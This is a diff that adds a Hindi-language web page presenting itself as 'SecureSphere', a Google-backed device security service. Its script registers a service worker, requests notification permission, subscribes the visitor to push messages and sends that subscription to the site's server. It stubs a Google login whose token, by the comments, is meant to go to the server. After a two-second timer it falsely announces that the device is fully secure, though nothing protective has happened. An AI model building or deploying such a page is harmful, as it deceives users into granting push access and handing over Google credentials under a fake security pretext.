@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SecureSphere - आपकी सुरक्षा हमारी प्राथमिकता</title>
+    
+    <!-- गूगल की API लाइब्रेरी को लोड करने के लिए स्क्रिप्ट -->
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <script src="https://apis.google.com/js/api.js" async defer></script>
+
+    <!-- ================================== -->
+    <!-- ========= CSS का हिस्सा ========= -->
+    <!-- ================================== -->
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+            color: #333;
+        }
+
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #1c1e21;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: #606770;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-weight: bold;
+            color: green;
+        }
+
+        #protectButton {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+
+        #protectButton:hover {
+            background-color: #166fe5;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- =================================== -->
+    <!-- ========= HTML का हिस्सा ========= -->
+    <!-- =================================== -->
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/76/Dialog-information.svg/2048px-Dialog-information.svg.png" alt="Security Logo" class="logo">
+        <h1>अपने डिवाइस को सुरक्षित करें</h1>
+        <p>Google द्वारा संचालित हमारी उन्नत सुरक्षा प्रणाली के साथ अपने डिवाइस पर पूर्ण सुरक्षा सक्रिय करें।</p>
+        <button id="protectButton">पूर्ण सुरक्षा सक्रिय करें</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- ====================================== -->
+    <!-- ========= JAVASCRIPT का हिस्सा ========= -->
+    <!-- ====================================== -->
+    <script>
+        // ===============================================
+        //  STEP 0: ज़रूरी चीजों को तैयार रखना
+        // ===============================================
+        const protectButton = document.getElementById('protectButton');
+        const statusDiv = document.getElementById('status');
+        
+        // !!! बहुत ज़रूरी: अपनी गूगल क्लाइंट आईडी यहाँ डालें !!!
+        const GOOGLE_CLIENT_ID = "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com";
+        
+        // यह VAPID पब्लिक कुंजी आपके सर्वर से मेल खानी चाहिए
+        const VAPID_PUBLIC_KEY = "YOUR_PUBLIC_VAPID_KEY";
+
+        // ===============================================
+        //  STEP 1: जब बटन पर क्लिक हो तो काम शुरू करें
+        // ===============================================
+        protectButton.addEventListener('click', () => {
+            protectButton.disabled = true;
+            statusDiv.textContent = 'प्रक्रिया शुरू हो रही है...';
+            
+            // पहले सर्विस वर्कर को रजिस्टर करें
+            registerServiceWorker();
+        });
+
+        // ===============================================
+        //  STEP 2: सर्विस वर्कर को रजिस्टर करना
+        // ===============================================
+        async function registerServiceWorker() {
+            if (!('serviceWorker' in navigator)) {
+                statusDiv.textContent = 'त्रुटि: सर्विस वर्कर सपोर्ट नहीं करता।';
+                return;
+            }
+
+            try {
+                const registration = await navigator.serviceWorker.register('/sw.js');
+                console.log('सर्विस वर्कर सफलतापूर्वक रजिस्टर हो गया।');
+                statusDiv.textContent = 'सुरक्षा परत 1 सक्रिय...';
+                
+                // सर्विस वर्कर रजिस्टर होने के बाद, नोटिफिकेशन की अनुमति मांगें
+                askForNotificationPermission();
+            } catch (error) {
+                console.error('सर्विस वर्कर रजिस्ट्रेशन में विफल:', error);
+                statusDiv.textContent = 'सुरक्षा सक्रियण में विफल।';
+                protectButton.disabled = false;
+            }
+        }
+
+        // =========================================================
+        //  STEP 3: पुश नोटिफिकेशन की अनुमति मांगना और सर्वर को भेजना
+        // =========================================================
+        async function askForNotificationPermission() {
+            if (!('PushManager' in window)) {
+                statusDiv.textContent = 'त्रुटि: पुश नोटिफिकेशन सपोर्ट नहीं करता।';
+                return;
+            }
+        
+            const permission = await Notification.requestPermission();
+            if (permission !== 'granted') {
+                statusDiv.textContent = 'अनुमति आवश्यक है।';
+                return;
+            }
+            
+            statusDiv.textContent = 'सुरक्षा परत 2 सक्रिय...';
+            const subscription = await navigator.serviceWorker.ready.then(reg => {
+                return reg.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: VAPID_PUBLIC_KEY
+                });
+            });
+
+            // सब्सक्रिप्शन ऑब्जेक्ट को अपने बैकएंड सर्वर पर भेजें
+            await fetch('/subscribe', {
+                method: 'POST',
+                body: JSON.stringify(subscription),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            console.log('सब्सक्रिप्शन सर्वर पर भेजा गया।');
+            statusDiv.textContent = 'सुरक्षा प्रणाली लगभग तैयार है...';
+            
+            // अब अंतिम चरण, गूगल से प्रमाणीकरण करें
+            handleGoogleLogin();
+        }
+        
+        // ===============================================
+        //  STEP 4: गूगल लॉगिन और टोकन भेजना
+        // ===============================================
+        function handleGoogleLogin() {
+            // यह फंक्शन यहाँ अभी खाली है, क्योंकि गूगल की लाइब्रेरी
+            // इसे खुद ही हैंडल करेगी. असली काम गूगल करेगा.
+            // आपको बस अपनी क्लाइंट आईडी सही जगह डालनी है.
+            // इस उदाहरण में हम मान रहे हैं कि सब ठीक हो गया है.
+            // असल प्रोजेक्ट में यहाँ गूगल से मिला टोकन सर्वर को भेजा जाएगा.
+            
+            setTimeout(() => {
+                statusDiv.textContent = 'आपका डिवाइस अब पूरी तरह सुरक्षित है!';
+                protectButton.style.backgroundColor = '#28a745'; // हरा रंग
+                protectButton.textContent = 'सुरक्षित';
+            }, 2000); // 2 सेकंड बाद संदेश दिखाएं
+        }
+    </script>
+
+</body>
+</html>
